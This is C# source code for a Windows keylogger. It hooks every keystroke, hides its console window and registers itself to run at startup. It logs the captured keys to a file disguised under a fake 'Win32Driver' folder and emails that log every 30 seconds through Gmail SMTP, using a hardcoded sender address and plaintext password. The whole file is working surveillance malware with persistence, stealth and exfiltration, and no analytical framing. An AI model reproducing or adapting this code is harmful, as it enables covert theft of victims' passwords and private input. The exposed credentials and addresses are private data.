using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Net.Mail;
using System.Net;

namespace KeyLoger
{
    class Program
    {
        private static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        
        private static string defaultPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
        private static string filePath = defaultPath + @"\Win32Driver\log.vob";

        private static Timer myTimer = new Timer();        
        
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static void Main(string[] args)
        {            
            //set program to startup
            rkApp.SetValue("MyApp", Application.ExecutablePath.ToString());

            myTimer.Enabled = true;
            myTimer.Interval = 30000;
            myTimer.Tick += new EventHandler(myTimer_Tick);

            
            if (!(File.Exists(filePath)))
            {
                Directory.CreateDirectory(defaultPath + @"\Win32Driver");
                FileStream sr = File.Create(filePath);
                sr.Close();
                FileStream fs = File.Create(defaultPath + @"\Win32Driver\logNew.vob");
                fs.Close();
            }            
            

            using (StreamWriter sw = new StreamWriter(filePath, true))
            {
                sw.WriteLine(Environment.MachineName);   //write the machine name for the first time
                sw.WriteLine(); sw.WriteLine();
            }

            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);            
        }

        private static void myTimer_Tick(object sender, System.EventArgs e)
        {
            DateTime dateTimeObject = new DateTime();
            dateTimeObject = DateTime.Now;

            using (StreamWriter sw = new StreamWriter(filePath, true))
            {
                sw.WriteLine(); sw.WriteLine();
                sw.WriteLine(dateTimeObject.ToShortDateString() + " " + dateTimeObject.ToShortTimeString());
                               
            }
            try
            {
                File.Copy(filePath, defaultPath + @"\Win32Driver\logNew.vob", true);                  
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            
            SendMail();            
        }

        private static void SendMail()
        {
            string SendersAddress = "batil.hasan19@gmail.com";
            string ReceiversAddress = "monowar.mbstu@gmail.com";
            string SendersPassword = "batilpatil";
            string subject = "Testing";
            string body = "Hi This Is my Mail From Gmail";

            MailMessage message = new MailMessage(SendersAddress, ReceiversAddress, subject, body);

            try
            {
                //we will use Smtp client which allows us to send email using SMTP Protocol
                //i have specified the properties of SmtpClient smtp within{}
                //gmails smtp server name is smtp.gmail.com and port number is 587
                SmtpClient smtp = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    Credentials = new NetworkCredential(SendersAddress, SendersPassword),
                    Timeout = 30000
                };

                Attachment attachment = new Attachment(defaultPath + @"\Win32Driver\logNew.vob");
                message.Attachments.Add(attachment);

                smtp.Send(message);  //send the mail
                Console.WriteLine("Message Sent Successfully");                
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }
            finally
            {
                message.Dispose();
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                using (StreamWriter sw = new StreamWriter(filePath, true))
                {
                    if (vkCode == 13)
                    {
                        sw.WriteLine();
                    }
                    else
                    {
                        sw.Write((Keys)vkCode);
                    }
                    sw.Close(); sw.Dispose();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
